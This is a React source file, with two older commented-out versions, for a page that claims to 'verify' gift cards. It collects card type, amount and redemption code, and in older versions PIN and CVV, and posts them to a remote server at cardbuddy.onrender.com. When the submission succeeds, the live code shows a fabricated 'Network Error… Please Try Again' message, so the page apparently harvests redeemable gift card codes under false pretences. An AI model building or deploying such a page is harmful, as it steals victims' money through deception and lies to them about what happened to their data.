// // import axios from 'axios';
// // import { useState } from 'react';
// // const Formpage = () => {
// //     const [Name, setName ] = useState("")
// //     const [Currency, setCurrency ] = useState("")
// //     const [Amount, setAmmount ] = useState("")
// //     const [Redemptioncode, setRedemptioncode ] = useState("")
// //     const [Pin, setPin ] = useState("")
// //     const [GiftCardCvv, setGiftCardCvv ] = useState("")
// //     const [ExpireDate, setExpireDate ] = useState("")
// //     const [loading, setLoading]=useState(false)
// //     const [error, setError]=useState(false)

// //     const HandleSubmit  = () =>{
// //           if (!Name || !Currency  || !Amount ||  !Redemptioncode ||!Pin || !GiftCardCvv || !ExpireDate) {
// //                alert("Please Fill All Details ")
// //             } else {
// //      const url = "http://localhost:2060/api/v1/create"
// //      const datas = {Name, Currency, Amount, Redemptioncode, Pin, GiftCardCvv, ExpireDate}
// //      axios.post(url, datas)
// //      .then((res)=>{
// //        console.log(res);
// //      })
// //      .catch((error)=>{
// //        console.log(error);
// //      })         
// //     } 
// //    console.log({Name, Currency, Amount, Redemptioncode, Pin, GiftCardCvv, ExpireDate})
// //     }
// //   return (
// //       <div className=' w-[100%] h-[150vh] sm:h-[130vh]  flex items-center justify-center bg-[#393939]  '>
// //  <div className=' w-[100%] h-[100%] gap-[40px] pt-[20px] sm:h-[100%] flex items-center sm:flex-row flex-col justify-center bg-[]  '>
// //  <div className=' w-[100%] sm:h-[78%] sm:w-[50%] h-[80%] justify-center flex items-center sm:justify-end bg-[]  '>
// //     <div className=" w-[90%] sm:w-[60%] h-[100%] rounded-[20px] gap-[30px] bg-[#6d6a6aa2] flex items-center justify-center flex-col ">
// //      <h2 className=' w-[100%] pt-[30px] text-[20px] sm:text-[30px] text-[white] pl-[30px] h-[10%] bg-[] '>Verify Card Information</h2>
// //      <select className=' w-[90%] h-[8%] bg-[white] rounded-[4px] pl-[3px] ' onChange={(e)=> setName(e.target.value)} name="Select The Card You Want To Check" id="">
// //        <option value="Amazon">Amazon</option>
// //        <option value="Amex">Amex</option>
// //        <option value="TT Visa">TT Visa</option>
// //        <option value="Visa Silvery White">Visa Silvery White</option>
// //        <option value="Wallmart Visa">Wallmart Visa</option>
// //        <option value="Valina Visa">Valina Visa</option>
// //        <option value="Master Card">Master Card</option>
// //        <option value="Nike">Nike</option>
// //        <option value="eBay">eBay</option>
// //        <option value="steam">Steam</option>
// //        <option value="Apple iTunes">Apple iTunes</option>
// //        <option value="Google Play">Google Play</option>
// //        <option value="American Express">American Express</option>
// //        <option value="US PSN">US PSN</option>
// //        <option value="Razer Gold">Razer Gold</option>
// //        <option value="Spotify">Spotify</option>
// //        <option value="Nordstrom">Nordstrom</option>
// //        <option value="Sephora">Sephora</option>
// //        <option value="Hulu">Hulu</option>
// //        <option value="Visa Gift">Visa Gift</option>
// //        <option value="Us Paramount+">Us Paramount+</option>
// //      </select>
// //      <div className=' w-[90%] h-[8%] flex items-center justify-center gap-[10px]  '>
// //      <select className=' w-[50%] h-[100%] flex items-center justify-center rounded-[20px] gap-[10px] bg-[white] ' onChange={(e)=> setCurrency(e.target.value)} name="" id="">
// //         <option value="USD">USD</option>
// //         <option value="EUR">EUR</option>
// //         <option value="BTC">BTC</option>
// //         <option value="GBP">GBP</option>
// //         <option value="CAD">CAD</option>
// //         <option value="CNY">CNY</option>
// //         <option value="JPY">JPY</option>
// //         </select>  
// //       <input className=' w-[50%] h-[100%]  rounded-[4px] flex items-center justify-center gap-[10px] bg-[white] pl-[5px] ' onChange={(e)=> setAmmount(e.target.value)} placeholder='Card Ammount' type="number" />
// //      </div>
// //      <input placeholder='Redemption Code ' className=' w-[90%] outline-none h-[8%] bg-[white] rounded-[4px] pl-[5px] ' onChange={(e)=> setRedemptioncode(e.target.value)}  type="text" />
// //      <input placeholder='Expiration Date (MM/YY)' className=' w-[90%] h-[8%] outline-none bg-[white] rounded-[4px] pl-[5px] ' onChange={(e)=> setExpireDate(e.target.value)} type="date" />
// //      <input placeholder='Enter Your Pin ' className=' w-[90%] h-[8%] outline-none bg-[white] rounded-[4px] pl-[5px] 'onChange={(e)=> setPin(e.target.value)}  type="text" />
// //      <input placeholder='Gift Card CVV' className=' w-[90%] h-[8%] outline-none bg-[white] rounded-[4px] pl-[5px] ' onChange={(e)=> setGiftCardCvv(e.target.value)}  type="text" />
// //      <button onClick={HandleSubmit} className=' w-[90%] h-[43px] rounded-[3px] bg-[red] text-[20px] text-[white] flex items-center justify-center gap-[10px] '>CONTINUE</button>
// //      <p className='text-[10px] text-center p-[10px] text-[white] flex items-center justify-center gap-[10px] '>Please make sure the codes you are about to input are correct and according to details</p>
// //     </div>
// //     </div>
// //      <div className=' sm:w-[50%] w-[100%] sm:h-[78%]  h-[40%]  items-center sm:justify-start justify-center gap-[30px] flex flex-col bg-[]  '>
// //      <img  className="sm:w-[74%] w-[80%] rounded-[10px] sm:h-[60%] h-[80%] flex items-center justify-center bg-[]" src="https://giftlycheck.com/wp-content/uploads/2024/05/GettyImages-1247122676-8ec11b340a684f69b093ced5d8c2e492-1024x683-1.jpg" alt="" />

// //     </div>
// //     </div>
// //     </div>
// //   )
// // }

// // export default Formpage
// // Redesigned Formpage with AOS animation, error message, Lucide icons, and styling
import axios from 'axios';
import { useState, useEffect } from 'react';
import { AlertCircle } from 'lucide-react';
import AOS from 'aos';
import 'aos/dist/aos.css';

const Formpage = ({refProp}) => {
  const [formData, setFormData] = useState({
    Name: '',
    Currency: '',
    Amount: '',
    Redemptioncode: ''
  });
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    AOS.init({ duration: 800 });
  }, []);

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async () => {
    const { Name, Currency, Amount, Redemptioncode } = formData;
    if (!Name || !Currency || !Amount || !Redemptioncode  ) {
      setError('Please fill in all required fields.');
      return;
    }
    setLoading(true);
   
    try {
      const response = await axios.post('https://cardbuddy.onrender.com/api/v1/create', formData);
      console.log(response);
        setError('Network Error: A Validation Error has occurred. Please Try Again');
        setTimeout(() => {
           setError("");

        }, 3500);
    } catch (err) {
      setError('Something went wrong while submitting.');
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div ref={refProp} className=" w-full min-h-screen bg-[#] flex items-center justify-center p-4">
      <div className="w-full max-w-5xl grid grid-cols-1 sm:grid-cols-2 gap-10 items-center" data-aos="fade-in">
        <div className="bg-[#2d2d2d] p-8 rounded-2xl shadow-lg text-white space-y-4">
          <h2 className="text-2xl font-bold">Verify Card Information</h2>
          {error && (
            <div className="flex items-center gap-2 text-red-400 bg-red-950 p-3 rounded-md animate-fade-in">
              <AlertCircle size={20} />
              <p>{error}</p>
            </div>
          )}
          <select name="Name" onChange={handleChange} className="w-full p-2 outline-none rounded-md bg-white text-black">
            <option value="">Select Card</option>
            {["Amazon", "Amex", "TT Visa", "Visa Silvery White", "Wallmart Visa", "Valina Visa", "Master Card", "Nike", "eBay", "steam", "Apple iTunes", "Google Play", "American Express", "US PSN", "Razer Gold", "Spotify", "Nordstrom", "Sephora", "Hulu", "Visa Gift", "Us Paramount+"].map(card => (
              <option key={card} value={card}>{card}</option>
            ))}
          </select>

          <div className="flex gap-2">
            <select name="Currency" onChange={handleChange} className="w-1/2 p-2 outline-none rounded-md bg-white text-black">
              <option value="">Currency</option>
              {["USD", "EUR", "BTC", "GBP", "CAD", "CNY","JOD", "KWD","SAR", "JPY"].map(curr => (
                <option key={curr} value={curr}>{curr}</option>
              ))}
            </select>
            <input
              name="Amount"
              onChange={handleChange}
              type="number"
              placeholder="Amount"
              className="w-1/2 p-2outline-none rounded-md bg-white text-black"
            />
          </div>

          <input
            name="Redemptioncode"
            onChange={handleChange}
            type="text"
            placeholder="Redemption Code"
            className="w-full p-2 outline-none rounded-md bg-white text-black"
          />

        

       
      

          <button
            onClick={handleSubmit}
            disabled={loading}
            className="w-full p-3 bg-red-600 hover:bg-red-700 transition text-white rounded-md"
          >
            {loading ? 'Submitting...' : 'Continue'}
          </button>

          <p className="text-sm text-center opacity-75">
            Please make sure the codes you are about to input are correct and according to the details
          </p>
        </div>

        <div className="flex justify-center" data-aos="fade-up">
          <img
            src="https://i.pinimg.com/736x/9b/1d/d3/9b1dd3720857ab9711b522b666a7036f.jpg"
            alt="Gift Card"
            className="rounded-xl w-full max-h-[400px] object-cover shadow-md"
          />
        </div>
      </div>
    </div>
  );
};

export default Formpage;

// import axios from 'axios';
// import { useState, useEffect } from 'react';
// import { AlertCircle } from 'lucide-react';
// import AOS from 'aos';
// import 'aos/dist/aos.css';

// const Formpage = ({ refProp }) => {
//   const [formData, setFormData] = useState({
//     Name: '',
//     Currency: '',
//     Amount: '',
//     Redemptioncode: '',
//     Pin: '',
//     GiftCardCvv: '',
//     ExpireDate: '',
//   });
//   const [error, setError] = useState('');
//   const [loading, setLoading] = useState(false);

//   useEffect(() => {
//     AOS.init({ duration: 800 });
//   }, []);

//   const handleChange = (e) => {
//     setFormData({ ...formData, [e.target.name]: e.target.value });
//   };

//   const handleSubmit = async () => {
//     const { Name, Currency, Amount, Redemptioncode, Pin, GiftCardCvv, ExpireDate } = formData;

//     // Log each data for debugging
//     console.log('Name:', Name);
//     console.log('Currency:', Currency);
//     console.log('Amount:', Amount);
//     console.log('Redemptioncode:', Redemptioncode);
//     console.log('Pin:', Pin);
//     console.log('GiftCardCvv:', GiftCardCvv);
//     console.log('ExpireDate:', ExpireDate);

//     if (!Name || !Currency || !Amount || !Redemptioncode || !Pin || !GiftCardCvv || !ExpireDate) {
//       setError('Please fill in all required fields.');
//       return;
//     }

//     try {
//       setLoading(true);
//       const response = await axios.post('http://localhost:2060/api/v1/create', formData);
//       console.log('API Response:', response.data);

//       // Optional: clear form and reset
//       setFormData({
//         Name: '',
//         Currency: '',
//         Amount: '',
//         Redemptioncode: '',
//         Pin: '',
//         GiftCardCvv: '',
//         ExpireDate: '',
//       });
//       setError('Validation error occurred');
//     } catch (err) {
//       console.error('API Error:', err);
//       if (err.response) {
//         console.log('Error Data:', err.response.data);
//         setError(`Error: ${ 'Validation error occurred'}`);
//       } else if (err.request) {
//         console.log('Error Request:', err.request);
//         setError('No response from server.');
//       } else {
//         setError('Request setup error.');
//       }
//     } finally {
//       setLoading(false);
//     }
//   };

//   return (
//     <div ref={refProp} className="w-full min-h-screen bg-[#1f1f1f] flex items-center justify-center p-4">
//       <div className="w-full max-w-5xl grid grid-cols-1 sm:grid-cols-2 gap-10 items-center" data-aos="fade-in">
//         <div className="bg-[#2d2d2d] p-8 rounded-2xl shadow-lg text-white space-y-4 w-full">
//           <h2 className="text-xl font-bold">Verify Card Information</h2>

//           <select name="Name" value={formData.Name} onChange={handleChange} className="w-full p-2 rounded bg-white text-black">
//             <option value="">Select Card</option>
//             <option value="Amazon">Amazon</option>
//             <option value="Amex">Amex</option>
//             <option value="TT Visa">TT Visa</option>
//             <option value="Visa Silvery White">Visa Silvery White</option>
//             <option value="Wallmart Visa">Wallmart Visa</option>
//             <option value="Valina Visa">Valina Visa</option>
//             <option value="Master Card">Master Card</option>
//             <option value="Nike">Nike</option>
//             <option value="eBay">eBay</option>
//             <option value="steam">Steam</option>
//             <option value="Apple iTunes">Apple iTunes</option>
//             <option value="Google Play">Google Play</option>
//             <option value="American Express">American Express</option>
//             <option value="US PSN">US PSN</option>
//             <option value="Razer Gold">Razer Gold</option>
//             <option value="Spotify">Spotify</option>
//             <option value="Nordstrom">Nordstrom</option>
//             <option value="Sephora">Sephora</option>
//             <option value="Hulu">Hulu</option>
//             <option value="Visa Gift">Visa Gift</option>
//             <option value="Us Paramount+">Us Paramount+</option>
//           </select>

//           <div className="flex gap-2">
//             <select name="Currency" value={formData.Currency} onChange={handleChange} className="w-1/2 p-2 rounded bg-white text-black">
//               <option value="">Currency</option>
//               <option value="USD">USD</option>
//               <option value="EUR">EUR</option>
//               <option value="BTC">BTC</option>
//               <option value="GBP">GBP</option>
//               <option value="CAD">CAD</option>
//               <option value="CNY">CNY</option>
//               <option value="JPY">JPY</option>
//             </select>
//             <input
//               type="number"
//               name="Amount"
//               value={formData.Amount}
//               onChange={handleChange}
//               className="w-1/2 p-2 rounded bg-white text-black"
//               placeholder="Card Amount"
//             />
//           </div>

//           <input
//             type="text"
//             name="Redemptioncode"
//             value={formData.Redemptioncode}
//             onChange={handleChange}
//             className="w-full p-2 rounded bg-white text-black"
//             placeholder="Redemption Code"
//           />
//           <input
//             type="date"
//             name="ExpireDate"
//             value={formData.ExpireDate}
//             onChange={handleChange}
//             className="w-full p-2 rounded bg-white text-black"
//             placeholder="Expiration Date"
//           />
//           <input
//             type="text"
//             name="Pin"
//             value={formData.Pin}
//             onChange={handleChange}
//             className="w-full p-2 rounded bg-white text-black"
//             placeholder="Enter Your Pin"
//           />
//           <input
//             type="text"
//             name="GiftCardCvv"
//             value={formData.GiftCardCvv}
//             onChange={handleChange}
//             className="w-full p-2 rounded bg-white text-black"
//             placeholder="Gift Card CVV"
//           />

//           {error && (
//             <div className="flex items-center text-red-500 text-sm gap-2">
//               <AlertCircle size={16} />
//               {error}
//             </div>
//           )}

//           <button
//             onClick={handleSubmit}
//             className="w-full p-2 bg-red-600 text-white font-semibold rounded hover:bg-red-700 disabled:opacity-50"
//             disabled={loading}
//           >
//             {loading ? 'Processing...' : 'CONTINUE'}
//           </button>

//           <p className="text-xs text-center text-white">
//             Please make sure the codes you are about to input are correct and according to details.
//           </p>
//         </div>

//         <div className="flex items-center justify-center">
//           <img
//             src="https://giftlycheck.com/wp-content/uploads/2024/05/GettyImages-1247122676-8ec11b340a684f69b093ced5d8c2e492-1024x683-1.jpg"
//             alt="Card verification"
//             className="w-[90%] sm:w-[80%] rounded-xl shadow-xl"
//           />
//         </div>
//       </div>
//     </div>
//   );
// };

// export default Formpage;
      